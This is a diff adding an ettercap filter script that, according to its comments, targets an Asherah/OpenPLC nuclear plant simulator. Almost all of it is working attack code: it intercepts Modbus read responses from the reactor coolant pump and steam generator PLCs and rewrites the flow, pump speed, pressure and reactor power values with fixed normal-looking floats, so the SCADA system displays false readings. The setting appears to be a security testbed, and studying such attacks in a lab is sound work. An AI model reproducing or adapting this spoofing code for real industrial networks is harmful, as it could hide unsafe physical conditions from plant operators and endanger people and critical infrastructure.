@@ -1,0 +1,109 @@
+############################################################################
+#                                                                          #
+#  ettercap -- etter.modbus.modify		                           #
+#                                                                          #
+#  Author: Michael Rowland                                                 #
+#                                                                          #
+#  This program is free software; you can redistribute it and/or modify    #
+#  it under the terms of the GNU General Public License as published by    #
+#  the Free Software Foundation; either version 2 of the License, or       #
+#  (at your option) any later version.                                     #
+#                                                                          #
+############################################################################
+
+##
+#
+#   This filter will modify a value being read from an Asherah Holding
+#   Register (OpenPLC, 4 byte Float, starts at 0d2048
+#   RCP PLC 			172.23.0.120
+#   RCP Holding Registers 
+#   RCP Flow       		0d2052/3  - nominally around 8700
+#   RCP Pump Speed 		0d2054/5  - nominally around 90-99%
+#   SG PLC 			172.23.0.121
+#   SG Holding Registers
+#   SG1 Pressure		0d2052/3  - nominally around 6.4 MPa
+#   SG2 Pressure		0d2054/5  - same as SG1
+#   Reactor Power		0d2056/6  - between 90-100
+#   Turbine Valve Position	0d2058/9  - between 5 - 115 (0 - 120 Range)
+
+# SG 0x03 - Read; 0x18 - 24 bytes
+# RCP 0x03 - Read; 0x1c1 - 28 bytes
+# Location of DATA.data 0x03, 0x18 - 0x49 0x4a
+# Location of RX Power - 0x5b 0x5c 
+
+if (ip.proto == TCP) {
+   msg("TCP message");
+   if (ip.src == '20.0.1.50') {
+	msg("Message from SCADA LTS");
+   }
+   if (ip.src == '20.0.1.10' && ip.len == 77) {
+	msg("Modbus response from RCP");
+	# DATA.data starts at [0]
+	if (DATA.data + 7 == 0x03) {
+	   msg("Read Response from RCP");
+	   # 32 bit float, 1234.5678 = 0x449a522b
+	   # DATA.data [9-12] = TIME_IN
+	   # Flow Rate 8801.4 kg/s = 0x4609859a
+	   DATA.data + 17 = 0x46;
+	   DATA.data + 18 = 0x09;
+	   DATA.data + 19 = 0x85;
+	   DATA.data + 20 = 0x9a;
+	   # DATA.data [13-16] = TIME_OUT
+	   # DATA.data [17-20] = RCP_FLOW
+	   # DATA.data [21-24] = RCP_PUMP_SPEED
+	   # 32 bit float, 98.00 = 0x42c40000
+	   DATA.data + 21 = 0x42;
+	   DATA.data + 22 = 0xc4;
+	   DATA.data + 23 = 0x00;
+	   DATA.data + 24 = 0x00;
+	   # DATA.data [25-28] = MANIPIO_CONTROL
+	   # DATA.data [29-32] = KPI
+	   # DATA.data [33-36] = Ti
+	   # DATA.data [37-40] = SET_POINT
+	   # DATA.data [41-44] = INIT
+	}
+   }
+   if (ip.src == '20.0.1.15' && ip.len == 85) {
+	msg("Message from SG");
+	if (DATA.data + 5 == 27 && DATA.data + 7 == 0x03) {
+	   #log(DATA.data, "/usr/tmp/payload");
+           # DATA.data [9-12] = TIME_IN
+	   #DATA.data + 9 = 0x41;
+	   #DATA.data + 10 = 0x6e;
+	   #DATA.data + 11 = 0x64;
+	   #DATA.data + 12 = 0x72;
+	   # DATA.data [13-16] = TIME_OUT
+	   #DATA.data + 13 = 0x65;
+	   #DATA.data + 14 = 0x61;
+	   #DATA.data + 15 = 0x20;
+	   #DATA.data + 16 = 0x4c;
+	   # DATA.data [17-20] = SG1_PRESSURE 
+	   # 6.41 MPa = 0x4ac39e20
+	   DATA.data + 17 = 0x4a;
+	   DATA.data + 18 = 0xc3;
+	   DATA.data + 19 = 0x9e;
+	   DATA.data + 20 = 0x20;
+	   # DATA.data [21-24] = SG2_PRESSURE
+	   DATA.data + 21 = 0x4a;
+	   DATA.data + 22 = 0xc3;
+	   DATA.data + 23 = 0x9e;
+	   DATA.data + 24 = 0x20;
+	   # DATA.data [25-28] = RX_POWER
+	   #  100.00 % full power = 0x42c80000
+	   DATA.data + 25 = 0x42;
+	   DATA.data + 26 = 0xc8;
+	   DATA.data + 27 = 0x00;
+	   DATA.data + 28 = 0x00;
+	   # DATA.data [29-32] = TB_VALVE_POS
+	   #DATA.data + 29 = 0x88;
+	   #DATA.data + 30 = 0x89;
+	   #DATA.data + 31 = 0x90;
+	   #DATA.data + 32 = 0x91;
+	   # DATA.data [33-36] = MANIPIO_CONTROL
+	   # DATA.data [37-40] = KPI
+	   # DATA.data [41-44] = Ti
+	   # DATA.data [45-48] = LOOK_UP_TEST
+	}
+   }
+}
+
